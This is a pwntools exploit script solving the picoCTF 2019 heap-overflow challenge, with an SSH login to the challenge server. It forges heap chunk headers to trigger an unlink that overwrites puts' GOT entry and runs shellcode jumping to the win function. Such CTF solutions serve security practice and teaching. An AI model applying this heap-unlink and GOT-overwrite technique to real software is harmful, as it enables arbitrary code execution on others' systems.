#!/usr/bin/env python3
from pwn import *
context(arch='i386', terminal=['tmux', 'neww'])
remote = ssh('afcidk', '2019shell1.picoctf.com', password='pass...')
remote.set_working_directory(
    b'/problems/heap-overflow_1_3f101d883699357e88af6bd1165695cd')

r = remote.process('./vuln')
e = ELF('./vuln')
#                         <- fullname_base
# +-----------+-----------+-----------------------+
# | prev_size |    size   |    fullname data      |
# +-----------+-----------+-----------------------+
# |                fullname data                  |
# +-----------------------------------------------+
# |                fullname data                  |
# +-----------------------------------------------+
#                         <- name_base
# +-----------+-----------+-----------------------+
# | prev_size |    size   |    name data          |
# +-----------+-----------+-----------------------+
# |                  name data                    |
# +-----------------------------------------------+
#                         <- lastname_base
# +-----------+-----------+-----------------------+
# | prev_size |    size   |    lastname data      |
# +-----------+-----------+-----------------------+
# |                lastname data                  |
# +-----------------------------------------------+

r.recvline()
fullname_base = int(r.recvline().split(b'\n')[0])
r.recvline()

name_base = fullname_base + (0x2a8 - 0x008)
lastname_base = fullname_base + (0x2f0 - 0x008)
win = e.symbols['win']
puts_got = e.got['puts']
print(f'[+] fullname_base: {hex(fullname_base)}')
print(f'[+] name_base:     {hex(name_base)}')
print(f'[+] lastname_base: {hex(lastname_base)}')

# Trigger unlink:
# * Chunk size > 80
# * PREV_INUSE is set
# * next chunk's is freed (next next chunk's PREV_INUSE is unset)
#
# Idea: overflow fullname, set lastname's PREV_INUSE to 0.
#       When we free fullname, unlink will be triggered.

payload = b'a' * (name_base - fullname_base - 8)  # dummy data of fullname
payload += p32(0)  # name's prev_size
payload += p32(0x48 | 0b001)  # name's size (PREV_INUSE should be 1)
payload += p32(puts_got - 12)  # name's fd
payload += p32(lastname_base)  # name's bk
payload += b'b' * (lastname_base - name_base - 8 - 8)  # dummy data of lastname
payload += p32(0)  # lastname's prev_size
payload += p32(
    0x60
)  # lastname's size (must be greater than 80, PREV_INUSE should be unset)

payload2 = asm(f'push {hex(win)}; ret')  # shellcode

r.sendline(payload)
r.sendline(payload2)
r.interactive()
